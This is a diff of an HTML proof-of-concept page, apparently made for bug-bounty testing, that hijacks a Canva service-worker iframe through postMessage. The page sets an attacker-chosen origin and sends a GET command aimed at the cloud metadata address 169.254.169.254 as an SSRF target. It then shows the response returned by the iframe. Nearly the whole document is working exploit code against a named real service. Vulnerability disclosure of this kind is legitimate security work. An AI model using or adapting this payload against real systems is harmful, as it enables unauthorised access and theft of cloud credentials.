@@ -1,25 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>postMessage Hijack PoC</title>
-</head>
+<head><title>Canva SW Hijack PoC</title></head>
 <body>
-  <h2>Canva Service Worker postMessage Hijack PoC</h2>
+  <h2>🔥 Canva postMessage Hijack via sw_iframe</h2>
 
-  <!-- Embed vulnerable Canva iframe with attacker-controlled origin -->
-  <iframe id="targetFrame"
-    src="https://ct.canva.com/_/service_worker/5510/sw_iframe.html"
+  <iframe
+    id="canvaFrame"
+    src="https://ct.canva.com/_/service_worker/5510/sw_iframe.html?origin=https://heroic-pastelito-45712a.netlify.app"
     style="width:100%; height:300px; border:1px solid black;"></iframe>
 
   <script>
     setTimeout(() => {
-      const iframe = document.getElementById("targetFrame");
-
       const message = {
-        clientId: "bugcrowdTest",
-        type: 1, // Command
+        clientId: "evilPoC",
+        type: 1, // command
         command: {
-          commandType: 0, // GET
+          commandType: 0, // 0 = GET
           params: {
             url: "http://169.254.169.254/latest/meta-data/", // SSRF target
             method: 0,
@@ -28,13 +24,16 @@
         }
       };
 
-      // ✅ Canva's iframe should trust this
-      iframe.contentWindow.postMessage(message, "https://ct.canva.com");
+      document.getElementById("canvaFrame").contentWindow.postMessage(
+        message,
+        "https://ct.canva.com"
+      );
     }, 3000);
 
     window.addEventListener("message", (event) => {
       if (event.origin === "https://ct.canva.com") {
-        alert("✅ Response:\n" + JSON.stringify(event.data, null, 2));
+        console.log("📥 Response from Canva iframe:", event.data);
+        alert("✅ Data received: " + JSON.stringify(event.data));
       }
     });
   </script>
